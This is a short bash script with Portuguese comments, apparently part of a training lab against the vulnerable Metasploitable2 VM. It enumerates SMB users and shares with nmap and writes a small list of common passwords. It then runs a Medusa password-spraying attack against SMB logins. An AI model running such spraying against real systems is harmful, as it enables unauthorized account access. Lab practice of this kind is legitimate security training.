#!/usr/bin/env bash
#
# 03_smb_password_spray.sh
# Enumeração de usuários via SMB (Samba) e password spraying
# contra o Metasploitable2.
#
# Password spraying = tentar UMA (ou poucas) senha(s) comuns contra
# MUITOS usuários, em vez de muitas senhas contra um único usuário.
# Isso reduz o risco de lockout de conta e é uma técnica realista
# usada por atacantes.
#
# USO:
#   ./03_smb_password_spray.sh <IP_DO_METASPLOITABLE>
#
set -euo pipefail

TARGET="${1:?Uso: $0 <IP_DO_ALVO>}"
USERS="../wordlists/usuarios.txt"
SPRAY_PASSWORDS="senhas_spray.txt"

echo "[*] 1) Enumeração de usuários e compartilhamentos via SMB"
nmap -p 139,445 --script smb-enum-users,smb-enum-shares "$TARGET"

echo "[*] 2) (Opcional) Enumeração complementar com enum4linux"
# enum4linux -a "$TARGET"

echo "[*] 3) Gerando lista reduzida de senhas para spraying (poucas tentativas por usuário)"
cat > "$SPRAY_PASSWORDS" <<EOF
msfadmin
123456
password
EOF

echo "[*] 4) Password spraying com Medusa contra o serviço SMB"
medusa -h "$TARGET" -U "$USERS" -P "$SPRAY_PASSWORDS" -M smbnt -t 3 -f

echo "[*] Concluído. Compare o tempo de resposta/bloqueios entre este método"
echo "    e o ataque de força bruta tradicional do passo 01."
